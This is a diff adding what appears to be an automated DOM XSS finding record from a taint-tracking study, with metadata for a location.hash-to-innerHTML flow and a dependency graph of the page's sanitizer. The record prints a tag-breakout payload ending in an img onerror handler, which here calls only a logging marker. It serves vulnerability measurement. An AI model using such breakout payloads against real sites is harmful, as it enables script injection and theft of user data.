@@ -1,0 +1,75 @@
+// Finding: d1e51517-23f0-4158-a961-a986e96e19f0
+// Finding.url: https://example135.com/iframe/2/twitter.min.html#1385540452904955912"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('891c50b651bd4a5b9771029f21fc04e6')><!--/*
+// Finding.parentloc: https://example135.com/iframe/2/twitter.min.html#1385540452904955912"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('891c50b651bd4a5b9771029f21fc04e6')><!--/*
+// Finding.domain: example135.com
+// Finding.base_domain: example135.com
+// Finding.source: location.hash
+// Finding.sink: innerHTML
+// Sanitizer.score: 24
+// Sanitizer.name: 
+// Sanitizer.location: https://example135.com/iframe/2/twitter.min.html#1385540452904955912"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('891c50b651bd4a5b9771029f21fc04e6')><!--/* - <anonymous>:1:1
+// Finding.begin: 401
+// Finding.end: 402
+// Finding.original_uuid: 9ec5e624-263f-4fa0-be86-088c8bf077f5
+// Finding.TwentyFiveMillionFlowsId: 1970354198
+// Finding.script: https://example135.com/iframe/2/twitter.min.html#1385540452904955912"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('891c50b651bd4a5b9771029f21fc04e6')><!--/*
+// Finding.line: 1
+// Exploit.uuid: 891c50b6-51bd-4a5b-9771-029f21fc04e6
+// Exploit.success: false
+// Exploit.status: validated
+// Exploit.method: C
+// Exploit.type: html
+// Exploit.token: attribute
+// Exploit.content: src
+// Exploit.quote_type: "
+// Exploit.tag: iframe
+// Exploit.break_out: 1385540452904955912"></iframe></style></script></object></embed></textarea><img src=x onerror=
+// Exploit.break_in: ><!--/*
+// Exploit.payload: 1385540452904955912"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog(1)><!--/*
+// Exploit.begin_taint_url: 48
+// Exploit.end_taint_url: 67
+// Exploit.replace_begin_url: 48
+// Exploit.replace_end_url: 67
+// Exploit.replace_begin_param: 150
+// Exploit.replace_end_param: 169
+// Issues.LargestEncodeAttrStringChain: 0
+// Issues.LargestTextFragmentEncodeChainLength: 0
+// Issues.HasApproximation: false
+// Issues.HasMissingImplementation: false
+// Issues.HasInfiniteRegexWithFunctionReplacer: false
+// Issues.MergedSplitAndJoins: false
+// Issues.HasUrlInRhsOfReplace: false
+// Issues.HasUrlInLhsOfReplace: false
+// Issues.HasCookieValueInLhsOfreplace: false
+// Issues.HasCookieValueInRhsOfreplace: false
+// Issues.HasCookieValueInMatchPattern: false
+// Issues.HasCookieValueInExecPattern: false
+// Issues.RemovedLRConcats: true
+// Issues.RemovedReplaceArtifacts: false
+// Issues.HasUrlInMatchPattern: false
+// Issues.HasUrlInExecPattern: false
+// Issues.RemovedNOPreplaces: false
+// Issues.Known_sanitizer: false
+// DepGraph.hash: -794320387
+// DepGraph.sanitizer_hash: 880440280
+// Removed LR concats 
+// Removed LR concats 
+digraph cfg {
+n0 [shape=house, label="Input: x"];
+n1 [shape=ellipse, label="preg_replace"];
+n2 [shape=box, label="RegExp: /\D/"];
+n3 [shape=box, label="Lit: "];
+n4 [shape=box, label="Var: x"];
+n5 [shape=ellipse, label="."];
+n6 [shape=box, label="Lit:  target=_blank style="background:url(//cdn.syndication.twimg.c....osition:absolute;text-align:center;top:0">Loading tweet...</a>"];
+n7 [shape=box, label="Var: x"];
+n8 [shape=doubleoctagon, label="Return: x"];
+n4 -> n0;
+n1 -> n2;
+n1 -> n3;
+n1 -> n4;
+n5 -> n1;
+n5 -> n6;
+n7 -> n5;
+n8 -> n7;
+}
